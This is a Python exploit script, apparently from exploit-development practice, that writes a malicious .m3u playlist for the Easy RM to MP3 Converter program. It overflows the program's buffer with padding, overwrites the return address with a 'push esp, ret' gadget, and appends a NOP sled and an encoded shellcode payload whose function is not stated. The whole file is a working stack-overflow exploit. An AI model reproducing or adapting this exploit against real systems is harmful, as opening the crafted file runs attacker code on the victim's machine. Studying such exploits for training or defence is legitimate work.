import struct

fuzz = "\x41" * (25000+1043)

# use push esp, ret
fuzz += struct.pack('<I',0x01911d88)

fuzz += "\x90" * 24
shellcode = "\xb8\x35\xa7\xd1\x7c\xdb\xd7\xd9\x74\x24\xf4\x5b\x33\xc9\xb1\x52\x31\x43\x12\x03\x43\x12\x83\xf6\xa3\x33\x89\x04\x43\x31\x72\xf4\x94\x56\xfa\x11\xa5\x56\x98\x52\x96\x66\xea\x36\x1b\x0c\xbe\xa2\xa8\x60\x17\xc5\x19\xce\x41\xe8\x9a\x63\xb1\x6b\x19\x7e\xe6\x4b\x20\xb1\xfb\x8a\x65\xac\xf6\xde\x3e\xba\xa5\xce\x4b\xf6\x75\x65\x07\x16\xfe\x9a\xd0\x19\x2f\x0d\x6a\x40\xef\xac\xbf\xf8\xa6\xb6\xdc\xc5\x71\x4d\x16\xb1\x83\x87\x66\x3a\x2f\xe6\x46\xc9\x31\x2f\x60\x32\x44\x59\x92\xcf\x5f\x9e\xe8\x0b\xd5\x04\x4a\xdf\x4d\xe0\x6a\x0c\x0b\x63\x60\xf9\x5f\x2b\x65\xfc\x8c\x40\x91\x75\x33\x86\x13\xcd\x10\x02\x7f\x95\x39\x13\x25\x78\x45\x43\x86\x25\xe3\x08\x2b\x31\x9e\x53\x24\xf6\x93\x6b\xb4\x90\xa4\x18\x86\x3f\x1f\xb6\xaa\xc8\xb9\x41\xcc\xe2\x7e\xdd\x33\x0d\x7f\xf4\xf7\x59\x2f\x6e\xd1\xe1\xa4\x6e\xde\x37\x6a\x3e\x70\xe8\xcb\xee\x30\x58\xa4\xe4\xbe\x87\xd4\x07\x15\xa0\x7f\xf2\xfe\xc5\x7f\xfe\xfa\xb1\x7d\xfe\x03\xf9\x0b\x18\x69\xed\x5d\xb3\x06\x94\xc7\x4f\xb6\x59\xd2\x2a\xf8\xd2\xd1\xcb\xb7\x12\x9f\xdf\x20\xd3\xea\xbd\xe7\xec\xc0\xa9\x64\x7e\x8f\x29\xe2\x63\x18\x7e\xa3\x52\x51\xea\x59\xcc\xcb\x08\xa0\x88\x34\x88\x7f\x69\xba\x11\x0d\xd5\x98\x01\xcb\xd6\xa4\x75\x83\x80\x72\x23\x65\x7b\x35\x9d\x3f\xd0\x9f\x49\xb9\x1a\x20\x0f\xc6\x76\xd6\xef\x77\x2f\xaf\x10\xb7\xa7\x27\x69\xa5\x57\xc7\xa0\x6d\x67\x82\xe8\xc4\xe0\x4b\x79\x55\x6d\x6c\x54\x9a\x88\xef\x5c\x63\x6f\xef\x15\x66\x2b\xb7\xc6\x1a\x24\x52\xe8\x89\x45\x77"
# eip = 0x01983f0f, 0x02b2d8d3
fuzz += shellcode
fuzz += "\x43" * (30000-25000-1043-4-24-351)
#fuzz += "\x43" * (30000-25000-1043-4)

filename = "C:\Documents and Settings\yunaranyancat\Desktop\EasyRMtoMP3Converter\push_esp.m3u"

with open(filename, 'w') as outfile:
    outfile.write(fuzz)

